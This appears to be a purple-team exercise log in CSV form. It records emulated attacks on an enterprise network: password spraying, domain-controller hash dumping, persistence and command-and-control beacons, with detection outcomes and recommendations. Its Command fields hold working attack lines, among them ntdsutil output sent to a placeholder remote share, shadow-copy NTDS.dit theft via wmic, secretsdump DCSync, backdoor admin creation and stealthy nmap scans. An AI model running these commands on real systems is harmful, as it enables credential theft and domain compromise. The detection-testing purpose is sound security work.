AssessmentGroup,Campaign,Phase,Variant,MitreID,CapecId,Method,Status,Outcome,Alert Severity,Alert Triggered,Activity Logged,Outcome Notes,Detection Recommendations,SourceIps,TargetAssets,ExpectedDetectionLayers,DetectingTools,Start Time,Start Time Epoch,Stop Time,Stop Time Epoch,Detection Time,Detection Time Epoch,Organizations,Tags,Objective,Command,References,Liklihood,Risk,Internal/External,Stealth,Attack Vector,Attack Complexity,Privileges Required,Attacker Tools
Enterprise Purple – 2017 Q1,External Password Attacks,Exploitation,Remote Access Portal - SSO Login,T1190,,Password Guessing,Completed,NotDetected,TBD,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",,2017-01-04T00:37:39.930Z,1483490259930,2017-01-04T02:37:15.930Z,1483497435930,2017-01-04T03:36:23.930Z,1483500983930,Security Risk Advisors,,"Brute force single password, large list of potential users","Capture login request
Brute force with intruder",,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q1,External Password Attacks,Exploitation,Simultaneous VPN Logins from different Geo's,T1078,,Suspicious Logins,Completed,NotDetected,TBD,TBD,TBD,,"1) VPN authentication logs are sent to a SIEM for further analysis, correlation and alerting",,,"Firewall,SIEM",,2017-01-04T12:56:51.930Z,1483534611930,2017-01-04T13:14:04.930Z,1483535644930,2017-01-04T14:30:47.930Z,1483540247930,Security Risk Advisors,,Login from two distinct geo's to test detection capabilities.,,,Medium,Medium,External,Low,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q1,External Password Attacks,Exploitation,Remote Access Portal - Office 365,T1190,,Password Guessing,Completed,NotDetected,TBD,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",,2017-01-04T05:12:00.930Z,1483506720930,2017-01-04T06:58:42.930Z,1483513122930,2017-01-04T07:39:36.930Z,1483515576930,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q1,External Password Attacks,Exploitation,Customer Portal Brute Force,T1190,,Password Guessing,Completed,NotDetected,TBD,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",,2017-01-04T09:38:29.930Z,1483522709930,2017-01-04T11:24:14.930Z,1483529054930,2017-01-04T12:52:12.930Z,1483534332930,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q1,Domain Controller Assault,Lateral Movement,Extract Password Hashes via NTDSUtil,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2017-01-19T03:47:46.930Z,1484797666930,2017-01-19T03:58:59.930Z,1484798339930,2017-01-19T04:02:59.930Z,1484798579930,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via NTDSUtils.,ntdsutil “ac in ntds” “ifm” “cr fu \\yourip\tmp” q q,,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Domain Controller Assault,Command & Control,Beacon SMB payload on a DC,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,Behavior Analytics,,2017-01-18T21:45:45.930Z,1484775945930,2017-01-18T23:04:55.930Z,1484780695930,2017-01-19T00:00:24.930Z,1484784024930,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Generate SMB beacon and run on DC,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Domain Controller Assault,Lateral Movement,Extract password hashes from DC by copying NTDS.dit,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2017-01-18T18:20:32.930Z,1484763632930,2017-01-18T18:21:35.930Z,1484763695930,2017-01-18T19:50:09.930Z,1484769009930,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,SMBexec
Enterprise Purple – 2017 Q1,Domain Controller Assault,Lateral Movement,Interactive Logon to a DC,T1078,,Compromise a DC,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to detect unusual logons to DCs from domain admin users and service accounts, potential detection of anomalous system access from UEBA tool",,,SIEM,,2017-01-18T15:05:24.930Z,1484751924930,2017-01-18T16:02:35.930Z,1484755355930,2017-01-18T17:41:34.930Z,1484761294930,Security Risk Advisors,,Perform anomalous interactive logons to a DC from privileged user and service accounts.  Once logged in establish persistent remote shell.,Use RDP to access DC and set up persistence,,Medium,High,Internal,Low,,,,
Enterprise Purple – 2017 Q1,Domain Controller Assault,Command & Control,Beacon HTTP payload on a DC,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,Behavior Analytics,,2017-01-19T00:02:09.930Z,1484784129930,2017-01-19T01:39:22.930Z,1484789962930,2017-01-19T02:32:05.930Z,1484793125930,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Start http listener and generate a payload from Attacks -> Packages,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Domain Controller Assault,Lateral Movement,Extract password hashes from DC using DC replication / DCSync,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,SIEM,,2017-01-19T04:13:15.930Z,1484799195930,2017-01-19T05:22:23.930Z,1484803343930,2017-01-19T05:52:33.930Z,1484805153930,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"Using impacket:
python secretsdump.py -just-dc DOMAIN/USER:PASSWORD@<DC IP>",,Medium,High,Internal,High,,,,
Enterprise Purple – 2017 Q1,Domain Controller Assault,Lateral Movement,Extract Password Hashes via VSS,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2017-01-19T07:26:49.930Z,1484810809930,2017-01-19T08:02:41.930Z,1484812961930,2017-01-19T09:58:45.930Z,1484819925930,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via VSS (Volume Shadow Services).,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin list shadows 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin create shadow /for=C: 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Temp\SYSTEM.hive 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence using .BAT file,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-01-15T02:04:43.930Z,1484445883930,2017-01-15T02:10:58.930Z,1484446258930,2017-01-15T04:02:40.930Z,1484452960930,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-01-14T23:23:07.930Z,1484436187930,2017-01-14T23:58:28.930Z,1484438308930,2017-01-15T01:08:20.930Z,1484442500930,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Endpoint Persistence,Persistence,Create a Local Administrator User on Server,T1136,,Backdoor Accounts,Completed,NotDetected,TBD,TBD,Yes,,"1) EDR tool alerts on suspicious use of Windows 'net user' and similar commands,2) SIEM alerts on local and domain user and group creation and modifications",,,"SIEM,EDR",,2017-01-15T07:39:23.930Z,1484465963930,2017-01-15T07:51:34.930Z,1484466694930,2017-01-15T09:48:25.930Z,1484473705930,Security Risk Advisors,,Create a Local administrator user after the compromise of a system.,"net user /add [username] [password]
new localgroup administrators [username] /add",,Medium,High,Internal,Low,,,,
Enterprise Purple – 2017 Q1,Endpoint Persistence,Persistence,Use of schtasks.exe for persistent jobs,T1053,,Scheduled tasks,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows task scheduler events,,,"SIEM,EDR",,2017-01-15T04:56:17.930Z,1484456177930,2017-01-15T06:12:54.930Z,1484460774930,2017-01-15T07:07:41.930Z,1484464061930,Security Risk Advisors,,Create a scheduled task,"schtasks /Create /SC DAILY /TN ""Malicious Task"" /TR ""C:MaliciousFile.bat"" /ST 09:00",,Medium,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Endpoint Persistence,Persistence,Use of sc.exe to create rogue service to maintain access,T1543.003,,Rogue Service Creation,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows service creation events,,,"SIEM,EDR",,2017-01-14T21:47:18.930Z,1484430438930,2017-01-14T22:05:09.930Z,1484431509930,2017-01-14T22:19:27.930Z,1484432367930,Security Risk Advisors,,Modification of the registry startup keys to launch a rogue service.,,,Low,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Endpoint Persistence,Persistence,Use of WMI Subscription for persistent jobs,T1546.003,,Windows Management Instrumentation,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect suspicious WMI execution,,,"SIEM,EDR",,2017-01-15T11:04:01.930Z,1484478241930,2017-01-15T11:52:40.930Z,1484481160930,2017-01-15T11:54:34.930Z,1484481274930,Security Risk Advisors,,Establish persistence using WMI event subscriptions.,"Create a one liner payload
cat payload.txt | iconv --to-code=UTF-16LE | base64 -w 0

Red team → Persistence → WMI Event Persistence using PowerShell",https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence,Medium,Medium,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2017 Q1,External Port Scans,Reconnaissance,"External - Moderate Port Scan with 10 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,Firewall,,2017-01-03T05:51:43.930Z,1483422703930,2017-01-03T06:03:24.930Z,1483423404930,2017-01-03T08:38:39.930Z,1483432719930,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 21,80,443,8080,8443 --script=ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-admin-check.nse,http-title.nse --script-args=http.useragent=""Mozilla/5.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_moderate -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2017 Q1,External Port Scans,Reconnaissance,"External - Noisy Port Scan with 1000 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,Firewall,,2017-01-03T13:53:58.930Z,1483451638930,2017-01-03T14:02:11.930Z,1483452131930,2017-01-03T15:24:12.930Z,1483457052930,Security Risk Advisors,,Identify open ports and services,nmap --open -v2 -sS -Pn -oA nmap_noisy -iL ranges.txt,,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2017 Q1,External Port Scans,Reconnaissance,"External - Stealthy Port Scan with 3 ports, service enumeration, limited NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,Firewall,,2017-01-03T09:43:34.930Z,1483436614930,2017-01-03T11:17:35.930Z,1483442255930,2017-01-03T12:32:03.930Z,1483446723930,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 80,443,8080 --data-length 471 --randomize-hosts --script=http-title.nse --script-args=http.useragent=""Mozilla/5.0;Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_stealthy -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTPS payload over tcp/443,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2017-01-12T14:34:27.930Z,1484231667930,2017-01-12T16:33:36.930Z,1484238816930,2017-01-12T18:33:23.930Z,1484246003930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Install SSL Certs From Lets Encrypt onto the server

Create a https listener",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Empire Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2017-01-13T02:49:52.930Z,1484275792930,2017-01-13T03:25:06.930Z,1484277906930,2017-01-13T04:21:49.930Z,1484281309930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","uselistener http

Stageless:
launchers <powershell or python> <listener name>

Staged:
usestager <stager-option>
set <option-name> <option-value>
execute",,Medium,High,Both,Medium,,,,Empire
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2017-01-12T10:31:05.930Z,1484217065930,2017-01-12T12:07:48.930Z,1484222868930,2017-01-12T13:31:46.930Z,1484227906930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.",Create a http listener,,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon SMB over tcp/445,T1571,,C2 channel,Completed,Blocked,TBD,No,TBD,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.,2) Suspicious SMB netconns and pivoting from internal systems is detected by EDR or behavioral tools. Examples may include unusual SMB connections from domain controllers and other critical assets.",,,"Firewall,Behavior Analytics",Gunhed,2017-01-13T07:14:42.930Z,1484291682930,2017-01-13T07:43:35.930Z,1484293415930,2017-01-13T08:53:02.930Z,1484297582930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various SMB.",Generate default SMB beacon using cobalt strike,,Medium,High,Internal,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Beacon DNS over udp/53,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,No,,"1) SIEM rules are configured to detect and alert on suspicious DNS traffic,12 Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Firewall,Behavior Analytics",,2017-01-13T05:52:02.930Z,1484286722930,2017-01-13T06:20:24.930Z,1484288424930,2017-01-13T07:04:54.930Z,1484291094930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Purchase a domain name

Create a windows/beacon_dns/reverse_dns_txt listener",,Medium,High,Both,High,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTP payload over tcp/80,T1095,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2017-01-12T19:18:30.930Z,1484248710930,2017-01-12T20:21:12.930Z,1484252472930,2017-01-12T22:13:25.930Z,1484259205930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTPS payload over tcp/443,T1095,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2017-01-12T23:09:14.930Z,1484262554930,2017-01-13T00:47:08.930Z,1484268428930,2017-01-13T02:28:07.930Z,1484274487930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
